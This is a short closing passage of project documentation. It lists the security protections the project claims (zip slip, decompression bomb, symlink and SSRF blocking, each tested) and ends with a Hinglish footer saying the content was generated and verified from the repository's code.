SECURITY  → zip slip, decompression bomb, symlink, SSRF — sab blocked & tested
```

---

*Yeh document repository ke actual code se banaya gaya hai. Har number,
formula aur file reference verify kiya gaya hai.*
